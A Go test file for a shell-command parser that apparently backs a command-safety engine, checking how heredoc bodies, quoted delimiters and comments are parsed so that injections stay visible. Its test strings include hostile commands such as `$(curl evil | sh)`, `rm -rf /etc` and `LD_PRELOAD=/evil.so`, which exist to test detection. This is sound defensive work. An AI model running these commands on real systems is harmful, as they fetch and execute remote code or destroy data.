package cmdparse

import (
	"reflect"
	"strings"
	"testing"
)

// TestHeredocBodyIsNeverALeaf pins the CORE of pg2-r2rf3: a heredoc body is an
// OPAQUE region, not a sequence of commands.
//
// splitCompound splits on '\n', so before the extent pass every line of a heredoc
// BODY became its own pseudo-leaf and arbitrary prose was handed to the rule chain as
// a command — `the .git/index is 0 bytes` parsed to a command whose executable is
// `the`. This asserts the leaf SET, not just a flag: exactly the real commands, and no
// leaf whose executable came out of the body.
func TestHeredocBodyIsNeverALeaf(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		wantExec []string // executables, in order
	}{
		{
			name:     "prose body: `the` must not become a command",
			command:  "cat <<EOF\nthe .git/index is 0 bytes\nEOF",
			wantExec: []string{"cat"},
		},
		{
			name:     "quoted delimiter, same prose",
			command:  "cat <<'EOF'\nthe .git/index is 0 bytes\nEOF",
			wantExec: []string{"cat"},
		},
		{
			name:     "body lines that LOOK like commands are still body",
			command:  "cat <<EOF\nrm -rf /etc\ngit push --force\nEOF\necho done",
			wantExec: []string{"cat", "echo"},
		},
		{
			name:     "body containing every compound separator",
			command:  "cat <<EOF\na && b || c ; d | e & f\nEOF",
			wantExec: []string{"cat"},
		},
		{
			name:     "commands after the terminator resume normally",
			command:  "cat <<EOF\nbody\nEOF\ngit status\necho hi",
			wantExec: []string{"cat", "git", "echo"},
		},
		{
			name:     "the rest of the OPERATOR line is still live shell syntax",
			command:  "cat <<EOF | grep x\nbody\nEOF\necho after",
			wantExec: []string{"cat", "grep", "echo"},
		},
		{
			name:     "two heredocs on one line consume consecutive bodies",
			command:  "cat <<A <<B\nbody a\nA\nbody b\nB\necho hi",
			wantExec: []string{"cat", "echo"},
		},
		{
			name:     "heredoc inside a subshell",
			command:  "(cat <<EOF\nbody\nEOF\n) && echo hi",
			wantExec: []string{"cat", "echo"},
		},
		// An UNTERMINATED heredoc is NOT in this table any more: over the seam it is a
		// PARSE FAILURE, so it yields no leaf at all rather than a `cat` leaf whose
		// extent swallowed the remainder. That is I1b and it is the MORE restrictive
		// answer (the whole expression floors at Abstain instead of being judged on one
		// leaf), so the case moved to its own assertion below rather than being edited
		// into a weaker expectation here.
		{
			name:     "a `<<` inside a COMMENT opens no heredoc, so the next line survives",
			command:  "echo hi # cat <<EOF\nrm -rf /etc",
			wantExec: []string{"echo", "rm"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			var got []string
			for _, pc := range leaves {
				got = append(got, pc.Executable)
			}
			if !reflect.DeepEqual(got, tt.wantExec) {
				t.Fatalf("Parse(%q) executables = %q, want %q", tt.command, got, tt.wantExec)
			}
		})
	}
}

// TestHeredocBodyIsNeverAnArg is the other half of the shredding defect: with the
// body glued to its leaf instead of split off, body words would land in Args and be
// judged as OPERANDS (a path-bearing rule would read a prose path as a real access).
// The body must reach neither leaves nor args.
func TestHeredocBodyIsNeverAnArg(t *testing.T) {
	leaves := Parse("cat <<EOF\nthe .git/index is 0 bytes\nEOF")
	if len(leaves) != 1 {
		t.Fatalf("want 1 leaf, got %d: %#v", len(leaves), leaves)
	}
	if got := leaves[0].Args; len(got) != 0 {
		t.Errorf("Args = %q, want none (body words must not become operands)", got)
	}
	// Raw DOES carry the body now, and that is I12 rather than a regression. The
	// outgoing Raw was POST-STRIP text, so re-parsing it re-derived a heredoc extent
	// that was no longer terminated (ADR 0039's root cause 2, its purest instance);
	// ADR 0039's Decision item 4 replaces it with the exact source slice of the owning
	// statement, body included, which is what makes the re-parse idempotent.
	//
	// The assertion this test exists for is the one above — body words must not become
	// OPERANDS — and it is unchanged. Judging the prose is prevented by the body not
	// being in Args and by the I2 heredoc floor, not by hiding the text from Raw.
	if !strings.Contains(leaves[0].Raw, ".git/index") {
		t.Errorf("Raw = %q dropped the body; I12 requires the exact source slice", leaves[0].Raw)
	}
	if !leaves[0].HasHeredoc {
		t.Error("the leaf must still be heredoc-bearing, or the I2 Abstain floor stops applying")
	}
}

// TestHeredocUnterminatedIsAParseFailure is the case lifted out of
// TestHeredocBodyIsNeverALeaf's table. The outgoing extent pass let an unterminated
// body swallow the rest of the input and still produced a `cat` leaf; the real
// grammar rejects the command, so I1b floors the whole expression with NO leaf
// examined. That is a FORFEITURE — any Reject a leaf would have earned is given up —
// and it is reported as such in the migration replay rather than presented as a win.
func TestHeredocUnterminatedIsAParseFailure(t *testing.T) {
	for _, src := range []string{
		"cat <<EOF\nrm -rf /etc\ngit push --force",
		// WITHOUT `<<-` a tab-indented terminator does not terminate, so this is
		// unterminated too — the contrast case for the `<<-` test below.
		"cat <<EOF\n\tindented body\n\tEOF\nrm -rf /etc",
	} {
		sp := ParseShell(src)
		if !sp.Unparseable {
			t.Errorf("ParseShell(%q): want unparseable, got %s", src, dumpLeaves(sp.Leaves))
		}
		if len(sp.Leaves) != 0 {
			t.Errorf("ParseShell(%q): I1b requires NO leaf, got %d", src, len(sp.Leaves))
		}
		if sp.Reason == "" {
			t.Errorf("ParseShell(%q): I10 requires a reason", src)
		}
	}
}

// TestHeredocQuotedDelimiterDetection pins the QUOTED/UNQUOTED distinction, which
// decides whether the body is executable text at all:
//
//	<<'EOF' / <<"EOF" / <<\EOF  -> body is entirely LITERAL, must NOT be evaluated
//	<<EOF                       -> body is EXPANDED, a $(...) in it really executes
//
// Getting this backwards either misses a real injection (treating an expanded body as
// literal) or manufactures false positives out of prose that merely quotes a shell
// command (treating a literal body as live). Every bash spelling that makes a body
// literal is enumerated here, because ANY quoting of ANY part of the word suffices.
func TestHeredocQuotedDelimiterDetection(t *testing.T) {
	tests := []struct {
		name       string
		command    string
		wantDelim  string
		wantQuoted bool
		wantStrip  bool
	}{
		{"bare delimiter expands", "cat <<EOF\nx\nEOF", "EOF", false, false},
		{"space before a bare delimiter", "cat << EOF\nx\nEOF", "EOF", false, false},
		{"single-quoted is literal", "cat <<'EOF'\nx\nEOF", "EOF", true, false},
		{"double-quoted is literal", "cat <<\"EOF\"\nx\nEOF", "EOF", true, false},
		{"backslash-escaped is literal", "cat <<\\EOF\nx\nEOF", "EOF", true, false},
		{"PARTIAL quoting is still literal", "cat <<E'O'F\nx\nEOF", "EOF", true, false},
		{"<<- strips tabs, delimiter still bare", "cat <<-EOF\nx\nEOF", "EOF", false, true},
		{"<<- with a quoted delimiter", "cat <<-'EOF'\nx\nEOF", "EOF", true, true},
		{"non-EOF delimiter word", "cat <<PAYLOAD\nx\nPAYLOAD", "PAYLOAD", false, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			if len(leaves) != 1 || len(leaves[0].Heredocs) != 1 {
				t.Fatalf("Parse(%q) = %#v, want 1 leaf with 1 heredoc", tt.command, leaves)
			}
			hd := leaves[0].Heredocs[0]
			if hd.Delimiter != tt.wantDelim {
				t.Errorf("Delimiter = %q, want %q", hd.Delimiter, tt.wantDelim)
			}
			if hd.Quoted != tt.wantQuoted {
				t.Errorf("Quoted = %v, want %v (quoting decides whether the body EXECUTES)", hd.Quoted, tt.wantQuoted)
			}
			if hd.StripTabs != tt.wantStrip {
				t.Errorf("StripTabs = %v, want %v", hd.StripTabs, tt.wantStrip)
			}
			if !hd.Terminated {
				t.Errorf("Terminated = false, want true for %q", tt.command)
			}
			if hd.Body != "x\n" {
				t.Errorf("Body = %q, want %q", hd.Body, "x\n")
			}
		})
	}
}

// TestHeredocDashTerminatorIsTabStripped pins the `<<-` half specifically: the
// tab-stripping form also strips tabs from the TERMINATOR line. Miss that and the
// terminator is never matched, the body extent runs to end of input, and every
// following command silently disappears from evaluation.
func TestHeredocDashTerminatorIsTabStripped(t *testing.T) {
	cmd := "cat <<-EOF\n\tindented body\n\tEOF\nrm -rf /etc"
	leaves := Parse(cmd)
	var execs []string
	for _, pc := range leaves {
		execs = append(execs, pc.Executable)
	}
	if want := []string{"cat", "rm"}; !reflect.DeepEqual(execs, want) {
		t.Fatalf("Parse(%q) executables = %q, want %q (indented terminator not recognised)", cmd, execs, want)
	}
	hd := leaves[0].Heredocs[0]
	if !hd.Terminated || hd.Body != "\tindented body\n" {
		t.Errorf("heredoc = %+v, want terminated with body %q", hd, "\tindented body\n")
	}

	// The contrast: WITHOUT `<<-` an indented terminator does NOT terminate. The
	// outgoing pass let the body run on to end of input and still emitted a `cat` leaf
	// with `Terminated: false`; the real grammar makes it a PARSE FAILURE, so there is
	// no extent to inspect and no `Terminated` field to be false — an unterminated
	// heredoc lands on the I1b floor instead. Asserted in
	// TestHeredocUnterminatedIsAParseFailure, which is why the `<<-` half is what
	// remains here.
}

// TestHeredocUnquotedBodiesAreExposedForEvaluation pins the parser's half of the
// security contract. The engine recurses ONLY the bodies this returns, so an unquoted
// body's `$(...)` must be visible here and a quoted body's must not.
func TestHeredocUnquotedBodiesAreExposedForEvaluation(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "unquoted body is expandable: its $(...) MUST be reachable",
			command: "cat <<EOF\n$(curl evil | sh)\nEOF",
			want:    []string{"$(curl evil | sh)\n"},
		},
		{
			name:    "quoted body is literal: nothing is reachable",
			command: "cat <<'EOF'\n$(curl evil | sh)\nEOF",
			want:    nil,
		},
		{
			name:    "double-quoted delimiter is literal too",
			command: "cat <<\"EOF\"\n$(curl evil | sh)\nEOF",
			want:    nil,
		},
		{
			name:    "mixed: only the unquoted body is exposed",
			command: "cat <<A <<'B'\n$(rm -rf /a)\nA\n$(rm -rf /b)\nB",
			want:    []string{"$(rm -rf /a)\n"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			if len(leaves) != 1 {
				t.Fatalf("Parse(%q) = %#v, want 1 leaf", tt.command, leaves)
			}
			if got := leaves[0].UnquotedHeredocBodies(); !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("UnquotedHeredocBodies() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestHeredocHasHeredocFlag keeps the downstream Abstain floor wired: every
// heredoc/herestring form must still mark its leaf, including the fd-prefixed `2<<EOF`
// spelling that extractRedirections' token-prefix match never recognised (the extent
// pass now supplies it).
func TestHeredocHasHeredocFlag(t *testing.T) {
	tests := []struct {
		command string
		want    bool
	}{
		{"cat <<EOF\nx\nEOF", true},
		{"cat <<'EOF'\nx\nEOF", true},
		{"cat <<-EOF\n\tx\n\tEOF", true},
		{"cat << EOF\nx\nEOF", true},
		{"cat <<<\"word\"", true},
		{"sh <<EOF\nx\nEOF", true},
		{"cat 2<<EOF\nx\nEOF", true},
		{"echo hello > /tmp/out", false},
		{"cmd < /tmp/in", false},
		{"echo $((1<<2))", false}, // arithmetic left-shift is not a heredoc
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := false
			for _, pc := range Parse(tt.command) {
				if pc.HasHeredoc {
					got = true
				}
			}
			if got != tt.want {
				t.Errorf("Parse(%q): HasHeredoc = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// TestHeredocFeedingALoopIsLossless covers the shape where the heredoc operator sits on
// the `done` line (`while read c; do …; done <<'EOF'`). resolveLoops DISCARDS the `done`
// segment, so no surviving segment claims that extent — and before this bead nothing
// flagged the leaf either, which is why the body's lines were shredded into real leaves
// and judged as commands (three corpus rows had their probe-harness DATA denied).
//
// The requirement is losslessness, not precise attribution: the body must not become
// leaves, and the extent must still reach SOME leaf so the engine's floor applies and an
// expandable body's substitutions are still recursed. The safety net attaches it to the
// last leaf, which can over-apply the floor but never under-apply it.
func TestHeredocFeedingALoopIsLossless(t *testing.T) {
	cmd := "while read c; do echo \"$c\"; done <<'EOF'\nrm -rf /etc\nLD_PRELOAD=/evil.so && echo hi\nEOF\necho after"
	leaves := Parse(cmd)
	var execs []string
	anyHeredoc := false
	extents := 0
	for _, pc := range leaves {
		execs = append(execs, pc.Executable)
		if pc.HasHeredoc {
			anyHeredoc = true
		}
		extents += len(pc.Heredocs)
		if len(pc.EnvVars) > 0 {
			t.Errorf("leaf %q carries env assignments %+v lifted out of the heredoc BODY", pc.Raw, pc.EnvVars)
		}
	}
	// The empty executable is the loop TERMINATOR's operator segment (`<<'EOF'`), which
	// pg2-qkecz stopped discarding: it is a command-less leaf of exactly the shape
	// `(cmd) > /etc/passwd` already produced. It is NOT a heredoc body line — the
	// assertion this test exists for. Carrying the extent on its own leaf is also more
	// precise than before, when resolveLoops dropped the segment and the leftover net
	// attached the extent to whichever leaf happened to be last.
	if want := []string{"read", "echo", "", "echo"}; !reflect.DeepEqual(execs, want) {
		t.Fatalf("Parse(%q) executables = %q, want %q (body lines must not become leaves)", cmd, execs, want)
	}
	if !anyHeredoc || extents != 1 {
		t.Fatalf("extent lost: anyHeredoc=%v extents=%d, want true/1 — the engine's floor and body recursion both key on it", anyHeredoc, extents)
	}
}

// TestHeredocInsideCommandSubstitutionStaysGlued documents the layering: a heredoc
// nested in a `$(...)` is NOT a top-level extent. The whole substitution is already
// inert to splitCompound, so nothing is shredded; the body is stripped one level down,
// when the engine recurses the substitution body back through Parse. This is corpus
// row 126856's shape.
func TestHeredocInsideCommandSubstitutionStaysGlued(t *testing.T) {
	outer := "PAYLOAD=$(cat <<'EOF'\n{\"title\": \"repo .git/index is 0 bytes\"}\nEOF\n)\necho \"$PAYLOAD\""
	leaves := Parse(outer)
	if len(leaves) != 2 {
		t.Fatalf("Parse = %#v, want 2 leaves (the assignment and the echo)", leaves)
	}
	if len(leaves[0].Heredocs) != 0 {
		t.Errorf("outer leaf claimed %d heredocs; a nested heredoc is not a top-level extent", len(leaves[0].Heredocs))
	}
	// One level down — exactly what the engine feeds back through Parse — the extent IS
	// top-level and the prose body is stripped.
	subs := EnumerateSubstitutions(leaves[0].Raw)
	if len(subs) != 1 {
		t.Fatalf("EnumerateSubstitutions(%q) = %#v, want 1", leaves[0].Raw, subs)
	}
	inner := Parse(subs[0].Body)
	if len(inner) != 1 || inner[0].Executable != "cat" {
		t.Fatalf("Parse(substitution body) = %#v, want the single `cat` leaf", inner)
	}
	if !inner[0].Heredocs[0].Quoted {
		t.Errorf("inner heredoc Quoted = false, want true for <<'EOF'")
	}
}

// TestHeredocCommentsInBodiesAreData REPLACES TestStripCommentsPreservingHeredocs,
// whose target (`StripCommentsPreservingHeredocs`) is deleted in ADR 0039 step 2.
//
// The property is unchanged and it is the one that mattered: a '#' inside a heredoc
// BODY is DATA, and in an EXPANDING (unquoted) heredoc the text after it can be a
// live `$( )`. Deleting it silently removed the injection before the parser saw it,
// dropping the Reject that should have been raised (pg2-r2rf3).
//
// What changes is that no pass has to be TAUGHT where the bodies are. Under
// KeepComments(true) a comment is a parser fact and a body is a `Redirect.Hdoc` node,
// so the property is asserted where it now lives: on the recorded extent the engine
// recurses, and on the leaf set for lines OUTSIDE any body.
func TestHeredocCommentsInBodiesAreData(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		wantBody string   // the extent handed to the engine's body recursion
		wantExec []string // and the leaves, so an outside-the-body comment is still not one
	}{
		{
			name:     "a '#' inside a body is data, not a comment",
			command:  "cat <<EOF\n# $(rm -rf /etc)\nEOF",
			wantBody: "# $(rm -rf /etc)\n",
			wantExec: []string{"cat"},
		},
		{
			name:     "a trailing '#' inside a body is data too",
			command:  "cat <<EOF\nnote # $(rm -rf /etc)\nEOF",
			wantBody: "note # $(rm -rf /etc)\n",
			wantExec: []string{"cat"},
		},
		{
			name:     "comments OUTSIDE the body are not commands",
			command:  "echo a # note\ncat <<EOF\n# body\nEOF\necho b # note2",
			wantBody: "# body\n",
			wantExec: []string{"echo", "cat", "echo"},
		},
		{
			name:     "a comment on the OPERATOR line is still a comment",
			command:  "cat <<EOF # note\nbody\nEOF",
			wantBody: "body\n",
			wantExec: []string{"cat"},
		},
		{
			name:     "<<- body and indented terminator both survive",
			command:  "cat <<-EOF\n\t# body\n\tEOF\necho b # note",
			wantBody: "\t# body\n",
			wantExec: []string{"cat", "echo"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			leaves := Parse(tt.command)
			var execs []string
			var bodies []string
			for _, pc := range leaves {
				execs = append(execs, pc.Executable)
				bodies = append(bodies, pc.UnquotedHeredocBodies()...)
			}
			if !reflect.DeepEqual(execs, tt.wantExec) {
				t.Fatalf("Parse(%q) executables = %q, want %q", tt.command, execs, tt.wantExec)
			}
			if len(bodies) != 1 || bodies[0] != tt.wantBody {
				t.Fatalf("exposed bodies = %q, want exactly [%q] — the '#' must survive into the body the engine recurses", bodies, tt.wantBody)
			}
		})
	}

	// A SHEBANG body line under a QUOTED delimiter is literal, so it is exposed to
	// nothing at all — and it must still not be mistaken for a comment-stripped
	// fragment or a command.
	t.Run("a shebang body line under a quoted delimiter survives and executes nothing", func(t *testing.T) {
		leaves := Parse("cat <<'EOF' > script.sh\n#!/bin/sh\necho hi\nEOF")
		if len(leaves) != 1 || leaves[0].Executable != "cat" {
			t.Fatalf("Parse = %#v, want the single `cat` leaf", leaves)
		}
		if got := leaves[0].UnquotedHeredocBodies(); got != nil {
			t.Errorf("a <<'EOF' body must be exposed to nothing; got %q", got)
		}
		if body := leaves[0].Heredocs[0].Body; body != "#!/bin/sh\necho hi\n" {
			t.Errorf("Body = %q, want the shebang and the echo verbatim", body)
		}
	})
}

// TestNonHeredocTextRecordsNoExtent REPLACES
// TestStripHeredocBodiesPreservesNonHeredocText, whose target
// (`stripHeredocBodies`) is deleted in ADR 0039 step 2.
//
// The old property was "the masking pass must not rewrite text it does not own",
// which only had meaning while a pass rewrote text. Its SURVIVING half is the one
// that was ever security-relevant: a `<<` that is NOT a heredoc operator — inside
// quotes, inside a comment, inside arithmetic, part of a herestring — must record no
// extent, because a phantom extent swallows the commands that follow it.
//
// The successor to "the text came through byte for byte" is I12: every leaf's Raw is
// an exact SLICE of the source, which is asserted here directly.
func TestNonHeredocTextRecordsNoExtent(t *testing.T) {
	for _, s := range []string{
		"git status",
		"cat file | grep foo",
		`find /tmp -type f \( -name "*.nix" \) 2>/dev/null`,
		"echo $((1<<2))",
		"echo '<<EOF'",
		"echo \"a<<b\"",
		"x=$(jq -r 'select(.a)' f) ; rm -rf /etc",
		"echo hi # <<EOF",
		"cat < /tmp/in",
	} {
		t.Run(s, func(t *testing.T) {
			for _, pc := range Parse(s) {
				if len(pc.Heredocs) != 0 || pc.HasHeredoc {
					t.Errorf("Parse(%q): leaf %q recorded a phantom heredoc %+v", s, pc.Raw, pc.Heredocs)
				}
				if pc.Raw != "" && !strings.Contains(s, pc.Raw) {
					t.Errorf("Parse(%q): leaf Raw %q is not a slice of the source (I12)", s, pc.Raw)
				}
			}
		})
	}

	// The herestring is separated out because it is the one spelling that DOES mark
	// its leaf while recording NO extent — I2 requires the floor for a herestring, and
	// keying HasHeredoc off a non-empty body would silently drop it.
	t.Run("a herestring marks its leaf but records no extent", func(t *testing.T) {
		leaves := Parse("cat <<<\"word\"")
		if len(leaves) != 1 || !leaves[0].HasHeredoc || len(leaves[0].Heredocs) != 0 {
			t.Fatalf("Parse = %#v, want one leaf with HasHeredoc and no extent", leaves)
		}
	})

	// `a << ; echo hi` has a `<<` with no delimiter word. The outgoing pass copied it
	// through untouched and let `echo hi` be a leaf; the real grammar rejects it, so
	// it lands on the I1b floor instead. That is the more restrictive direction and it
	// is recorded here rather than left to be discovered.
	t.Run("a `<<` with no delimiter word is a parse failure, not a copied-through token", func(t *testing.T) {
		sp := ParseShell("a << ; echo hi")
		if !sp.Unparseable {
			t.Fatalf("want unparseable, got leaves %#v", sp.Leaves)
		}
		if len(sp.Leaves) != 0 {
			t.Errorf("I1b: unparseable must carry no leaves, got %d", len(sp.Leaves))
		}
	})
}
